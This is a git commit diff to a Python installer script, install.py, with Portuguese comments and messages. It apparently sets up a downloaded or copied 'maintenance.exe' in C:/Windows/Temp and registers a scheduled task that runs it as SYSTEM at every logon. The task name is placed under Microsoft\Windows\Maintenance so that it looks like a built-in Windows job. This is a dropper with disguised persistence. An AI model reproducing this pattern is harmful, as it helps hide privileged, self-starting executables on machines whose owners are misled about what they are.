90df6c9104802662621fe17d10f4f02b8b61037b
Vinícius <viniciusgarcia158@hotmail.com>
2024-06-17 14:23:58 -0300

    modificado install para copiar exe na pasta temp

--- install.py
+++ install.py
@@ -1,13 +1,32 @@
-import os, logging
+import os, logging, time
+import shutil
 from urllib import request
 
+diretorio_atual = os.getcwd()
 logging.basicConfig(level=logging.INFO, filename="install.log", format="%(asctime)s - %(levelname)s - %(message)s")
+
+arquivo = 'maintenance.exe'
+destino = 'c:/Windows/Temp/maintenance.exe'
+logging.info(f"O diretório de execução atual é: {diretorio_atual}")
+try:
+    shutil.copy(arquivo, destino)
+except:
+    print('deu erro ao copiar')
+
+
+
+# Exibir o diretório de trabalho atual
 
 
 request.urlretrieve("url" , 'c:/Windows/Temp/maintenance.exe')
+
+#fazer função de copia maintaenance de local atual  para c:/win/temp
 
 try:
     os.popen(rf'schtasks /create /sc ONLOGON /ru System /tr c:\Windows\Temp\maintenance.exe /tn Microsoft\Windows\Maintenance\maintenance')
     logging.info('maintenance task create with successful')
 except:
     logging.error('maintenance task was not create')
+
+
+time.sleep(100)
